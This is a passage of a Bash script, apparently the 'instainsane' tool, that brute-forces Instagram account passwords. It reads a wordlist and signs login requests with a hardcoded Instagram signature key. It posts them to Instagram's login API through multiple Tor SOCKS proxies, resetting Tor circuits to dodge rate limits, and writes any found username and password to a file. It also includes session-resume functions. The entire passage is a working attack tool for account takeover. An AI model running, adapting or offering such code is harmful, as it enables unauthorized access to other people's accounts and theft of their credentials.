countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'


let counter4++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then  echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid4=$! ; # wait $!;

let startline+=20
let endline+=20

done

}


bf5resume() {

while [ $counter5 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
startresume1=$((startresume+1))
IFS=$'\n'
for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter5++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1 ; wait $pid3 > /dev/null 2>&1 ; wait $pid4 > /dev/null 2>&1; wait $! > /dev/null 2>&1 ;

let startline+=20
let endline+=20

done
}


function resume() {

banner 
checkroot
dependencies

countern=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$countern" "$list" "$wl_pass" "$pass"
let countern++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads=100
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
multitor

while [ true ]; do
killall -HUP tor
###pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3"; pkill -f -HUP "tor -f multitor/multitor4"; pkill -f -HUP "tor -f multitor/multitor5"

bf1resume 
let turn+=20
bf2resume
let turn+=20
bf3resume
let turn+=20
bf4resume 
let turn+=20
bf5resume

let turn-=60
###
killall -HUP tor
#pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3";pkill -f -HUP "tor -f multitor/multitor4";pkill -f -HUP "tor -f multitor/multitor5"

done
}


case "$1" in --resume) resume ;; *)

banner
checkroot
dependencies
start
multitor
killall -HUP tor
while [ $countpass -lt $count_pass ]; do

killall -HUP tor
##pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3";pkill -f -HUP "tor -f multitor/multitor4";pkill -f -HUP "tor -f multitor/multitor5"

bf1 
let turn+=20
bf2 
let turn+=20
bf3 
let turn+=20
bf4 
let turn+=20
bf5 
let turn-=60
killall -HUP tor
###
#pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3"; pkill -f -HUP "tor -f multitor/multitor4"; pkill -f -HUP "tor -f multitor/multitor5"
done
exit 1
esac
